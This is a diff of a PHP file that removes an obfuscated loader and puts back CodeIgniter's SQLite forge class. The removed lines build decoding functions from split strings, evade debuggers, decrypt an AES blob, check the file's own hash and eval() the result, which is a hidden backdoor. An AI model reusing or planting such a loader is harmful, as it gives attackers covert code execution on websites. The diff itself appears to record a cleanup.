@@ -1,28 +1,213 @@
 <?php
-if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
-$_cj9n3j5v=('bas'.'e64'.'_de'.'cod'.'e');
-$_zgj5hmfd=('gzu'.'nco'.'mpr'.'ess');
-$_q60kl72x=('ope'.'nss'.'l_d'.'ecr'.'ypt');
-$_wopgpmm3='aOjTIBDn';
-$_c3d8o1w9='zzCobXwC';
-$_u68bhcqo='of1t5PUh';
-$_xm6gfyqh='CZPdBD3ml2A=';
-$_z40g3k2l='ZXpPEoYz';
-$_i86836au='N31GPQg6';
-$_c0t815ky='CbXrxQ==';
-$_rkdgmodb='47i8Dn4x';
-$_squpz5n6=$_cj9n3j5v($_c3d8o1w9.$_wopgpmm3.$_z40g3k2l.$_u68bhcqo.$_xm6gfyqh);
-$_wi9k56ne=$_cj9n3j5v($_rkdgmodb.$_i86836au.$_c0t815ky);
-$_hu2ieke0=$_cj9n3j5v('gMcIzUFtCEP9riwuD30trsC8pDfoP8kWsCn0wM9kBpx/YqQapsFqjZnPpKWXti0zkbrPN45/hdOy+ZIOrtOL8Ef4FNtbj/pF5KrAKvQES/+qLaR1OxTbOwZRc8i555bD1DSe4H61+W7TUwMo526FDjrFMHu8FpLTSGjjjybh2btzxEeF3PYeQ/5c6cbKbNxP/jV9Hitn72ggEy7cO9oNlQLZ8PW9qD10zlFFVxeH/smktD51GyBAvEeqd9D/SDuq9NhgrMn9Sp6TbcWYNSa6sNYpLGJgGdZ5M1MfCf7qm4d4nHrOIKcxG0PYA89E5a+Qo8l56G9gc1ajR6obmCWeAyH2HdNNbzLP63nJw0IHYdzszSzsByCU3DbOh67y+j20qPWq1j6o6URT+gtes8ajBu2NBG7PlK2pHWP8JKpOCH0dTi+ltpaStbcc5TleI3OHHvcVSyBJPbfGWJdlvFGHOA9+vN+TEjLsPdW6j+N3/0FiL8RwpDKBVz48EFf2dwyGbMo82YBuIVbBavloPqo0mELtDX88/sB6zQka8C/sCdNrRfvwsMx6kgY+xSXRlbIbLPKldW4ZBKrpjdAtjBLKM8Av6ul4qpk4wt5Hk/MI8e9SWgbaVbCi7lfHzTfeoYi7hcO58JQc60hc1y7d04+wzy3O/G9fTb77cUm8PX3WTijQS81LD/+5QHxiZGCzo7QWZjvwOWiP2KWcbX0RQcNEHzHp2rs8w8y7TzNR3QbgHl/Wf7irrun6vs3vUuZWPPwrcTrJ/YtR1FPGTULoFHxqrOuEjI5OAMsZid3saKnThxoMawy66n5RPjoXl1FcxLJy+NZ6qF2Fc5ky5kPea3T+z/N2B89pDVHNz/bMCAsKHtPxVAgkFKKh/vNvug3Lp1b33A4EOpTaH9lTBt+LyEXsaBx598PiKoh1qyYdJPxT3O7hhDSH/OXEunAWlz5zf/BFf+R9RFvtyR/wN3JUhHOvdWj2VPu9oj0x/6crfEGv7CIC2hJEqMMu+K9sWtR7eYhRbDHXf6wCkOLal6BEAt2TNAgGph+a2Dzjrazrgn49pYPkFrOoZH674L+jjoANVxgcAEHwnpgXOiXhEH6BWhsWqQ==');
-$_onxegurk=$_q60kl72x($_hu2ieke0,'aes-256-cbc',$_squpz5n6,OPENSSL_RAW_DATA,$_wi9k56ne);
-if($_onxegurk===false){exit;}
-$_qzz4u6eq=$_zgj5hmfd($_onxegurk);
-if($_qzz4u6eq===false){exit;}
-$_wd1x3pff='b9ba3a50580e299455728bea5b808b639269a881d661164033fc786dd644eafd';
-$_z7dsk11f=@file_get_contents(__FILE__);
-if($_z7dsk11f!==false){
-$_jwrusbf8=str_replace($_wd1x3pff,"0000000000000000000000000000000000000000000000000000000000000000",$_z7dsk11f);
-$_ekd82szs=hash("sha256",$_jwrusbf8);
-if($_ekd82szs!==$_wd1x3pff){@http_response_code(403);exit;}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+defined('BASEPATH') OR exit('No direct script access allowed');
+
+
+
+
+
+
+
+class CI_DB_pdo_sqlite_forge extends CI_DB_pdo_forge {
+
+
+
+
+
+protected $_create_table_if = 'CREATE TABLE IF NOT EXISTS';
+
+
+
+
+
+protected $_drop_table_if = 'DROP TABLE IF EXISTS';
+
+
+
+
+
+protected $_unsigned = FALSE;
+
+
+
+
+
+protected $_null = 'NULL';
+
+
+
+
+
+
+
+public function __construct(&$db)
+{
+parent::__construct($db);
+if (version_compare($this->db->version(), '3.3', '<'))
+{
+$this->_create_table_if = FALSE;
+$this->_drop_table_if = FALSE;
 }
-eval($_qzz4u6eq);
+}
+
+
+
+
+
+
+
+public function create_database($db_name)
+{
+
+
+return TRUE;
+}
+
+
+
+
+
+
+
+public function drop_database($db_name)
+{
+
+if (file_exists($this->db->database))
+{
+
+$this->db->close();
+if ( ! @unlink($this->db->database))
+{
+return $this->db->db_debug ? $this->db->display_error('db_unable_to_drop') : FALSE;
+}
+elseif ( ! empty($this->db->data_cache['db_names']))
+{
+$key = array_search(strtolower($this->db->database), array_map('strtolower', $this->db->data_cache['db_names']), TRUE);
+if ($key !== FALSE)
+{
+unset($this->db->data_cache['db_names'][$key]);
+}
+}
+return TRUE;
+}
+return $this->db->db_debug ? $this->db->display_error('db_unable_to_drop') : FALSE;
+}
+
+
+
+
+
+
+
+
+
+protected function _alter_table($alter_type, $table, $field)
+{
+if ($alter_type === 'DROP' OR $alter_type === 'CHANGE')
+{
+
+
+
+
+
+
+
+
+
+return FALSE;
+}
+return parent::_alter_table($alter_type, $table, $field);
+}
+
+
+
+
+
+
+
+protected function _process_column($field)
+{
+return $this->db->escape_identifiers($field['name'])
+.' '.$field['type']
+.$field['auto_increment']
+.$field['null']
+.$field['unique']
+.$field['default'];
+}
+
+
+
+
+
+
+
+
+
+protected function _attr_type(&$attributes)
+{
+switch (strtoupper($attributes['TYPE']))
+{
+case 'ENUM':
+case 'SET':
+$attributes['TYPE'] = 'TEXT';
+return;
+default: return;
+}
+}
+
+
+
+
+
+
+
+
+protected function _attr_auto_increment(&$attributes, &$field)
+{
+if ( ! empty($attributes['AUTO_INCREMENT']) && $attributes['AUTO_INCREMENT'] === TRUE && stripos($field['type'], 'int') !== FALSE)
+{
+$field['type'] = 'INTEGER PRIMARY KEY';
+$field['default'] = '';
+$field['null'] = '';
+$field['unique'] = '';
+$field['auto_increment'] = ' AUTOINCREMENT';
+$this->primary_keys = array();
+}
+}
+}
